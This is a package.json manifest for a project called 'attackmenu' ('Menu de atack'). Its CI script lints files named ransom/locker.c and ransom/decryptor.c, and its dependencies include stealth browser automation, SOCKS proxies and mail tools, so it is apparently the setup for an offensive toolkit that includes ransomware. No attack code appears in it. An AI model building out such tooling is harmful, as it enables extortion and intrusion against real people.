{
  "name": "attackmenu",
  "version": "1.0.0",
  "description": "Menu de atack",
  "license": "ISC",
  "author": "vava",
  "type": "module",
  "main": "src/main.ts",
  "scripts": {
    "start":    "docker compose up py -d && docker compose run --rm ts",
    "start:py": "docker compose up py",
    "start:ts": "npx tsx main.ts",
    "build":             "docker compose build --pull=false py ts && docker compose --profile build-only build --pull=false compiler",
    "build:py":          "docker compose build --pull=false py",
    "build:ts":          "docker compose build --pull=false ts",
    "build:compiler":    "docker compose --profile build-only build --pull=false compiler",
    "dev":      "docker compose up --build --pull=never",
    "down":     "docker compose down",
    "test":     "vitest run",
    "test:py":  "docker compose build py && docker compose run --rm -e PYTHONPATH=/app -v \"$(pwd)/tests-p:/app/tests-p\" -v \"$(pwd)/pytest.ini:/app/pytest.ini\" py python3 -m pytest tests-p -v",
    "ci":       "tsc --noEmit && vitest run && cppcheck --enable=warning,style,performance,portability --suppress=missingIncludeSystem --suppress=missingInclude --suppress=normalCheckLevelMaxBranches --suppress=checkersReport --error-exitcode=1 compiler/ransom/locker.c compiler/ransom/decryptor.c"
  },
  "dependencies": {
    "@anthropic-ai/sdk": "^0.80.0",
    "@inquirer/prompts": "^8.2.0",
    "axios": "^1.13.6",
    "chalk": "^5.6.2",
    "cors": "^2.8.6",
    "dotenv": "^17.2.3",
    "express": "^5.2.1",
    "global-agent": "^4.1.3",
    "imapflow": "^1.2.9",
    "ink": "^5.0.1",
    "ink-spinner": "^5.0.0",
    "inquirer": "^13.2.2",
    "mongodb": "^7.1.0",
    "nodemailer": "^8.0.1",
    "ora": "^9.3.0",
    "puppeteer": "^24.39.1",
    "puppeteer-core": "^24.39.1",
    "puppeteer-extra": "^3.3.6",
    "puppeteer-extra-plugin-stealth": "^2.11.2",
    "react": "^18.3.1",
    "selfsigned": "^5.5.0",
    "socks": "^2.8.7",
    "socks-proxy-agent": "^9.0.0",
    "tsx": "^4.21.0",
    "typescript": "^5.9.2",
    "ws": "^8.18.3"
  },
  "devDependencies": {
    "@gradio/client": "^1.19.0",
    "@types/express": "^5.0.6",
    "@types/node": "^25.5.0",
    "@types/nodemailer": "^7.0.9",
    "@types/puppeteer": "^5.4.7",
    "@types/react": "^18.3.1",
    "@types/ws": "^8.5.14",
    "@vitest/coverage-v8": "^4.1.2",
    "vitest": "^4.1.2"
  }
}
